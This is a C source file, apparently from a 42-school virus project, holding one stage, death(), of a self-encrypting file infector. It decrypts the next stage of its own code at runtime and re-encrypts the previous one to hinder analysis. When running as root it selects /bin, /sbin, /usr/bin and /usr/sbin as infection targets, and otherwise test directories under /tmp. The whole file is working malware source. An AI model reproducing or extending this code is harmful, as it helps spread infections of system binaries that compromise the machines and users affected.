/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   death.c                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/03/12 18:17:19 by ddinaut           #+#    #+#             */
/*   Updated: 2019/04/22 21:02:53 by ddinaut          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "death.h"

/*
  Looking for uid and directory
*/
void	death(t_data *data)
{
	revert_two(&data->key, (char*)opening, (size_t)death - (size_t)opening);

#ifdef DEBUG
	char log[] = "death\t\t";
	_log(log, NULL, 7, data->context);
#endif

	if (data->context == false)
		end(data);

	if (_getuid() == 0)
	{
		t_directory root = {_random_number(ROOT_ENTRY), {"/bin", "/sbin", "/usr/bin", "/usr/sbin"}};
		update_two(&data->key, (char*)death, (size_t)locate - (size_t)death);
		revert_two(&data->key, (char*)locate, (size_t)inspect - (size_t)locate);
		locate(data, &root);
	}
	else
	{
		t_directory user = {_random_number(USER_ENTRY), {"/tmp/test", "/tmp/test2"}};
		update_two(&data->key, (char*)death, (size_t)locate - (size_t)death);
		revert_two(&data->key, (char*)locate, (size_t)inspect - (size_t)locate);
		locate(data, &user);
	}
}
